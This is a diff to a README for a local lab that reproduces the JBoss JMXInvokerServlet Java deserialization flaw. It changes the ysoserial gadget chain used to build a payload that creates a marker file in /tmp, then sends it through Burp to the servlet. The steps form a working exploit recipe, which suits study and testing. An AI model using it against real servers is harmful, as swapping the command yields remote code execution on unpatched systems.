@@ -11,7 +11,7 @@ JBOSS (CVE)
 - Run jboss: java -jar ./JBoss/jboss-5.1.0.GA/bin/run.jar
 - Download and open Burp: setup your proxy on localhost:9090
 - In your browser start proxy on localhost:9090
-- Generate the payload with ysoserial: java -jar ysoserial.jar CommonsCollections1 "touch /tmp/JbossVulnerable.txt" > JbossPayload.ser or use the payload inside the folder JBoss
+- Generate the payload with ysoserial: java -jar ysoserial.jar CommonsCollections5 "touch /tmp/JbossVulnerable.txt" > JbossPayload.ser or use the payload inside the folder JBoss
 - Open localhost:8080/invoker/JMXInvokerServlet
 - In Burp "paste from file" and choose JbossPayload.ser
 - Checkout in /tmp folder the execution of "touch /tmp/JbossVulnerable.txt"
